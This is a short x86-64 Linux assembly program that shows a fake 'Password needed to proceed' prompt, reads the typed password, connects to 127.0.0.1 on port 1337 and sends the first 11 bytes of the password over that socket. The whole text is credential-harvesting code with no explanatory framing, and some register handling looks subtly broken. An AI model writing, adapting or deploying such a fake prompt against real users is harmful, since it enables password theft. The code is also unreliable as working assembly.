global _start
section .text

section .bss
   password resb 20

section .data
   prompt: db "Password needed to proceed: "
   len: equ $-prompt

_start:

   xor rax, rax
   mov al, 1 ;syscall number for write
   add rdi, 1 ;stdout
   mov rsi, prompt ;prompt to write
   add rdx, len ;length of prompt
   syscall
  
   xor rax, rax ;syscall for read()
   xor rdi, rdi ;stdin = 0
   mov rsi, password ;addr of reserved bytes
   add rdx, 20 ;length of reserved bytes
   syscall

   xor rax, rax
   xor rdi, rdi
   xor rsi, rsi
   mov al, 41 ;socket() syscall
   add rdi, 2 ;AF_INET
   add rsi, 1 ;SOCK_STREAM
   xor rdx, rdx ;protocol 0
   syscall ;socket(AF_INET, SOCK_STREAM, 0)

   mov rdi, rax ;sockfd as return value
   xor rax, rax
   push rax ;bzero
   mov dword [rsp-4], 0x0100007f ;socket.inet_aton('127.0.0.1') in py
   mov word [rsp-6], 0x3905 ;port 1337 htons(1337)
   mov word [rsp-8], 2 ;AF_INET
   sub rsp, 8 ;align the stack pointer now that we added data to the stack

   xor rax, rax
   mov al, 42 ;connect() syscall
   mov rsi, rsp ;address of netowrk structure pushed earlier 
   xor rdx, rdx
   add rdx, 16 ;int addr_len
   syscall

   xor rax, rax
   add rax, 1
   mov rsi, password
   mov rdx, 11
   syscall
   
   xor rax, rax
   add rax, 60
   xor rdi, rdi
   syscall

